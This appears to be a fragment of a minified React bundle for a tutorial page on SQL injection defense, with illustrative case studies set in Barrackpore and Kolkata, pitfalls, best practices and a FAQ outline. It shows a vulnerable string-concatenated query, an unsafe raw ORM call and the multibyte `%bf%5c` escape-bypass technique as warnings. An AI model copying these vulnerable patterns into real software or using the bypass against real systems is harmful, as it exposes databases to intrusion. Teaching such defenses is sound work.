border-emerald-500 text-emerald-400 shadow-lg shadow-emerald-950/40":"bg-slate-900/60 border-slate-800 text-slate-400 hover:text-slate-200 hover:bg-slate-900"),children:n.phaseNumber},a)})}),e.jsxs("div",{className:"p-6 rounded-2xl bg-slate-900/80 border border-slate-800 space-y-6",children:[e.jsxs("div",{className:"flex flex-col sm:flex-row sm:items-center justify-between gap-3 border-b border-slate-800 pb-4",children:[e.jsxs("div",{children:[e.jsx("span",{className:"text-xs font-mono text-cyan-400 font-semibold uppercase tracking-wider",children:t.phaseNumber}),e.jsx("h3",{className:"text-lg sm:text-xl font-bold text-white mt-1",children:t.title})]}),e.jsx("span",{className:i("px-3 py-1 rounded-full text-xs font-mono font-semibold border w-fit",t.badgeColor==="emerald"&&"bg-emerald-950/80 text-emerald-300 border-emerald-700",t.badgeColor==="cyan"&&"bg-cyan-950/80 text-cyan-300 border-cyan-700",t.badgeColor==="purple"&&"bg-purple-950/80 text-purple-300 border-purple-700",t.badgeColor==="rose"&&"bg-rose-950/80 text-rose-300 border-rose-700"),children:t.badge})]}),e.jsx("p",{className:"text-xs sm:text-sm text-slate-300 leading-relaxed",children:t.explanation}),e.jsxs("div",{className:"space-y-2",children:[e.jsx("span",{className:"text-xs font-mono text-slate-400 font-semibold",children:"Code Demonstration & Execution Telemetry:"}),e.jsx("pre",{className:"p-4 rounded-xl bg-slate-950 border border-slate-800 font-mono text-xs text-emerald-300 overflow-x-auto leading-relaxed",children:t.sqlSnippet})]}),e.jsxs("div",{className:"space-y-2 pt-2 border-t border-slate-800/80",children:[e.jsx("span",{className:"text-xs font-mono text-slate-400 font-semibold",children:"Architectural Takeaways:"}),e.jsx("ul",{className:"grid grid-cols-1 md:grid-cols-3 gap-3 text-xs text-slate-300",children:t.keyTakeaways.map((a,n)=>e.jsxs("li",{className:"p-3 rounded-lg bg-slate-950/70 border border-slate-800/60 flex items-start gap-2",children:[e.jsx("span",{className:"text-emerald-400 font-bold",children:"✓"}),e.jsx("span",{children:a})]},n))})]})]})]}),e.jsxs("section",{id:"case-studies",className:"space-y-6",children:[e.jsxs("div",{className:"border-l-4 border-purple-500 pl-4",children:[e.jsx("h2",{className:"text-2xl sm:text-3xl font-bold text-white tracking-tight",children:"3. Real-World Engineering Scenarios in Bengal"}),e.jsx("p",{className:"text-slate-400 mt-1 text-sm sm:text-base",children:"Security case studies in Barrackpore and Kolkata demonstrating parameterized migration and dynamic allowlisting."})]}),e.jsxs("div",{className:"grid grid-cols-1 md:grid-cols-2 gap-6",children:[e.jsxs("div",{className:"p-6 rounded-2xl bg-slate-900/80 border border-slate-800 space-y-4",children:[e.jsxs("div",{className:"flex flex-col sm:flex-row sm:items-center justify-between gap-2 border-b border-slate-800 pb-3",children:[e.jsxs("h3",{className:"text-base font-bold text-white flex items-center gap-2",children:[e.jsx("span",{className:"w-2.5 h-2.5 rounded-full bg-emerald-400"}),"Case 1: Mamata & Susmita – Eliminating SQLi in Barrackpore Retail Store"]}),e.jsx("span",{className:"text-xs font-mono text-emerald-400 bg-emerald-950/80 px-2.5 py-1 rounded-full border border-emerald-800",children:"100% Remediated"})]}),e.jsxs("p",{className:"text-xs sm:text-sm text-slate-300 leading-relaxed",children:["In Barrackpore, a legacy POS search endpoint concatenated product inputs: ",e.jsx("code",{children:"SELECT * FROM inventory WHERE item_name LIKE '%$input%'"}),". Attackers injected tautology payloads to dump full inventory lists. Mamata refactored the backend using Node.js ",e.jsxs("code",{children:["mysql2.execute('SELECT * FROM inventory WHERE item_name LIKE ?', [`%$",input,"%`])"]}),". All injected quotes were treated as literal characters, neutralizing the vulnerability completely."]})]}),e.jsxs("div",{className:"p-6 rounded-2xl bg-slate-900/80 border border-slate-800 space-y-4",children:[e.jsxs("div",{className:"flex flex-col sm:flex-row sm:items-center justify-between gap-2 border-b border-slate-800 pb-3",children:[e.jsxs("h3",{className:"text-base font-bold text-white flex items-center gap-2",children:[e.jsx("span",{className:"w-2.5 h-2.5 rounded-full bg-cyan-400"}),"Case 2: Abhronila & Debangshu – Dynamic Allowlist Defense in Kolkata Bank"]}),e.jsx("span",{className:"text-xs font-mono text-cyan-400 bg-cyan-950/80 px-2.5 py-1 rounded-full border border-cyan-800",children:"₹50 Crore Ledger Guard"})]}),e.jsxs("p",{className:"text-xs sm:text-sm text-slate-300 leading-relaxed",children:["In Kolkata, an analytics dashboard processing ₹50 Crores in financial transactions allowed users to sort ledgers dynamically. To prevent SQL injection in the ",e.jsx("code",{children:"ORDER BY"})," clause where ",e.jsx("code",{children:"?"})," placeholders are not supported, Debangshu implemented a strict dictionary allowlist. Any unapproved column input defaulted safely to ",e.jsx("code",{children:"created_at"}),", preventing injection into table sorting clauses."]})]})]})]}),e.jsxs("section",{id:"pitfalls-rules",className:"space-y-6",children:[e.jsxs("div",{className:"border-l-4 border-rose-500 pl-4",children:[e.jsx("h2",{className:"text-2xl sm:text-3xl font-bold text-white tracking-tight",children:"4. Senior Pitfalls & Production Best Practices"}),e.jsx("p",{className:"text-slate-400 mt-1 text-sm sm:text-base",children:"Avoid dangerous escaping anti-patterns and unsafe ORM raw query methods."})]}),e.jsxs("div",{className:"grid grid-cols-1 md:grid-cols-2 gap-6",children:[e.jsxs("div",{className:"p-6 rounded-2xl bg-slate-900/80 border border-slate-800",children:[e.jsxs("h3",{className:"text-base font-bold text-rose-400 mb-3 flex items-center gap-2",children:[e.jsx("span",{children:"⚠️"})," Pitfall 1: Relying on String Escaping (addslashes)"]}),e.jsx("p",{className:"text-xs sm:text-sm text-slate-300 leading-relaxed mb-3",children:"Multibyte character encodings (GBK/Big5) can consume backslash escape characters (%bf%5c), resurrecting injected quotes."}),e.jsx("div",{className:"text-xs font-mono text-emerald-400 p-2 bg-slate-950 rounded border border-slate-800",children:"Rule: Always use true binary-protocol prepared statements over escaping functions."})]}),e.jsxs("div",{className:"p-6 rounded-2xl bg-slate-900/80 border border-slate-800",children:[e.jsxs("h3",{className:"text-base font-bold text-rose-400 mb-3 flex items-center gap-2",children:[e.jsx("span",{children:"⚠️"})," Pitfall 2: Using Raw String Concatenation inside ORMs"]}),e.jsxs("p",{className:"text-xs sm:text-sm text-slate-300 leading-relaxed mb-3",children:["Using methods like ",e.jsxs("code",{children:["prisma.$queryRawUnsafe(`SELECT ... $",input,"`)"]})," re-introduces SQL injection into modern ORM codebases."]}),e.jsx("div",{className:"text-xs font-mono text-emerald-400 p-2 bg-slate-950 rounded border border-slate-800",children:"Rule: Use standard ORM CRUD methods or parameterized tagged template literals."})]}),e.jsxs("div",{className:"p-6 rounded-2xl bg-slate-900/80 border border-slate-800",children:[e.jsxs("h3",{className:"text-base font-bold text-emerald-400 mb-3 flex items-center gap-2",children:[e.jsx("span",{children:"✓"})," Best Practice 1: Combine Prepared Statements with PoLP"]}),e.jsx("p",{className:"text-xs sm:text-sm text-slate-300 leading-relaxed mb-3",children:"Ensure application database service accounts possess 0 DDL permissions, providing defense-in-depth even if application code fails."}),e.jsx("div",{className:"text-xs text-slate-400",children:"Limits the blast radius of any theoretical application compromise."})]}),e.jsxs("div",{className:"p-6 rounded-2xl bg-slate-900/80 border border-slate-800",children:[e.jsxs("h3",{className:"text-base font-bold text-emerald-400 mb-3 flex items-center gap-2",children:[e.jsx("span",{children:"✓"})," Best Practice 2: Disable Detailed Error Messages in Production"]}),e.jsx("p",{className:"text-xs sm:text-sm text-slate-300 leading-relaxed mb-3",children:"Return generic HTTP 500 error responses to clients while writing detailed SQL exception stack traces to secure private log aggregators."}),e.jsx("div",{className:"text-xs text-slate-400",children:"Prevents error-based SQL injection reconnaissance by attackers."})]})]})]}),e.jsxs("section",{id:"printable-note",className:"space-y-6",children:[e.jsxs("div",{className:"border-l-4 border-emerald-500 pl-4",children:[e.jsx("h2",{className:"text-2xl sm:text-3xl font-bold text-white tracking-tight",children:"5. Printable Study Note & Teacher Advice"}),e.jsx("p",{className:"text-slate-400 mt-1 text-sm sm:text-base",children:"Download complete printable notes and review key takeaways from Sir Sukanta Hui."})]}),e.jsx(u,{title:"Topic 10: SQL Injection (SQLi) Vulnerabilities: Attack Vectors and Parameterized Queries / Prepared Statements Defense",content:h}),e.jsx(d,{note:"SQL injection is 100% preventable. The golden rule is simple: NEVER concatenate untrusted user strings into SQL queries. Always use Parameterized Queries (Prepared Statements) with connection.execute() or PreparedStatement, validate dynamic column names against strict allowlists, and pair your code with least-privilege database service accounts!"})]}),e.jsxs("section",{id:"faq-section",className:"space-y-6",children:[e.jsxs("div",{className:"border-l-4 border-cyan-500 pl-4",children:[e.jsx("h2",{className:"text-2xl sm:text-3xl font-bold text-white tracking-tight",children:"6. Frequently Asked Questions (30 Deep-Dive Questions)"}),e.jsx("p",{className:"text-slate-400 mt-1 text-sm sm:text-base",children:"Master the technical nuances of SQL injection defense, binary protocol execution, and allowlist security."})]}),e.jsx(m,{title:"SQL Injection & Prepared Statements Defense FAQs",questions:p})]})]})]})};export{S as default};
